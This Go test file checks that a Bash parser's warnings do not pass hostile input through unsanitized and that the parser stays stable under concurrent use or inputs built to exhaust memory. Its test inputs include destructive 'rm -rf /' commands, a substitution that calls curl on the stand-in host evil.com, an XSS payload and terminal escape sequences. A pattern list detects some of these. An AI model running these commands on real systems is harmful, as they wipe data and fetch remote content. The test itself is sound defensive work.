package integration

import (
	"context"
	"strings"
	"testing"
)

// SEC1: No Command Injection in Diagnostics
// Warning messages should not contain raw unsanitized user input that could
// be exploited if displayed in a terminal or web UI.
func TestWarningMessageSafety(t *testing.T) {
	t.Parallel()
	bp := NewBashParser()

	inputs := []string{
		// Potential injection payloads
		`rm -rf / ; echo "$(curl evil.com)"`,
		"echo '\x1b[31mred\x1b[0m'",            // ANSI escape codes
		`echo "<script>alert('xss')</script>"`, // XSS payload
		"echo '\x1b[2J\x1b[H'",                 // Clear screen sequence
		`echo "$(rm -rf /)"`,                   // Command substitution
		"echo '\x00hidden'",                    // Null bytes
	}

	dangerousPatterns := []string{
		"<script>",
		"\x1b[", // ANSI escape
		"curl evil",
	}

	for _, input := range inputs {
		_, warnings := bp.Parse(context.Background(), input)
		for _, w := range warnings {
			for _, pattern := range dangerousPatterns {
				if strings.Contains(w.Message, pattern) {
					t.Errorf("warning message contains unsanitized input pattern %q: %s",
						pattern, w.Message)
				}
			}
		}

		result := bp.ParseAndExtract(context.Background(), input, 0)
		for _, w := range result.Warnings {
			for _, pattern := range dangerousPatterns {
				if strings.Contains(w.Message, pattern) {
					t.Errorf("extraction warning contains unsanitized input pattern %q: %s",
						pattern, w.Message)
				}
			}
		}
	}
}

// SEC2: Memory Safety with Malicious Input
// Parser must not panic or segfault on adversarial memory-pressure inputs.
func TestMemorySafety(t *testing.T) {
	t.Parallel()
	bp := NewBashParser()

	inputs := []string{
		string(make([]byte, MaxInputSize)),   // Max size zeros
		string(make([]byte, MaxInputSize+1)), // Over max
		"\x00\x00\x00\x00",                   // Null bytes
		strings.Repeat("\x00", 10000),        // Many null bytes
		strings.Repeat("\xff", 10000),        // Many 0xFF bytes
		strings.Repeat("\n", 10000),          // Many newlines
		strings.Repeat(";", 10000),           // Many semicolons
	}

	for _, input := range inputs {
		label := "input"
		if len(input) <= 20 {
			label = strings.ReplaceAll(input[:min(10, len(input))], "\x00", "\\0")
		} else {
			label = strings.ReplaceAll(input[:10], "\x00", "\\0") + "..."
		}
		t.Run(label, func(t *testing.T) {
			assertNoPanic(t, "Parse(memory-safety)", func() {
				bp.Parse(context.Background(), input)
			})
			assertNoPanic(t, "ParseAndExtract(memory-safety)", func() {
				bp.ParseAndExtract(context.Background(), input, 0)
			})
		})
	}
}

// SEC2b: Concurrent access memory safety
// Multiple goroutines parsing simultaneously must not cause data races.
func TestConcurrentMemorySafety(t *testing.T) {
	t.Parallel()
	bp := NewBashParser()

	// Already tested in TestBashParserConcurrentStress but with extraction too
	done := make(chan struct{})
	for i := 0; i < 10; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			for j := 0; j < 50; j++ {
				bp.ParseAndExtract(context.Background(), "DIR=/tmp; rm -rf $DIR", 0)
			}
		}()
	}
	for i := 0; i < 10; i++ {
		<-done
	}
}
